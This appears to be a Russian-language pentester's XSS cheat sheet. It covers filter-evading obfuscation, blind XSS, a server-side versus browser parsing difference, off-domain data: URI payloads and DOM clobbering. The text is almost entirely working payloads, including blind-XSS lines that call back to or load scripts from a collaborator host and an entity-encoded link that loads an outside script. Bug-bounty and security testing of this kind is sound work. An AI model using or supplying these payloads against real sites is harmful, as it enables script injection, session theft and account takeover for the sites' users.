## Обфускация

- против регулярок - переносы строк, смена регистра
- внутри HTML-атрибутов и SVG-тегов можно использовать XML/HTML entity encoding
- названия функций можно кодировать в UTF  `\u00 + 'Щ'.charCodeAt(0).String(16)`
- в функцию можно передать hex-энкод:

```js
setTimeout`\x61\x6c\x65\x72\x74\x28\x31\x29\` 
```

## Blind XSS

```
"><img src=burpcollab> - 1) отстук подтверждает HTML инъекцию (можно взять другой тэг с src на случай сторгой CSP)
"><img/src/onerror=fetch(burpcollab,{mode:'no-cors'})> - 2) отстук подтверждает выполнение js
"><script src=burpcollab></script> - 3) CSP не блокирует загрузку внешних скриптов
```

```
</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
```

## Server-side

by [slonser](https://t.me/slonser_notes)

Содержимое этих тегов не обрабатывается как html теги:
```
iframe
noembed
noframes
noscript
plaintext
title
textarea
```
Соответственно при вводе:
```html
<textarea><a href="x></textarea><img src=x onerror=alert()//">
```
Результат парсинга на серверной стороне будет выглядеть следующим образом:
```html
textarea
a
  ->href: x></textarea><img src=x onerror=alert()//
```
В то время как в браузере это будет выглядеть следующим образом:
```html
<textarea>&lt;a href="x&gt;</textarea><img src="x" onerror="alert()//&quot;">
```

## Off-domain XSS

```
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg==">
```xml
<a src="data:javascript,alert(1)" href="javascript:alert(2)"></a>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<embed src="data:text/html;base64,%(base64)s">
```

## DOM XSS

### DOM Clobbering

https://domclob.xyz/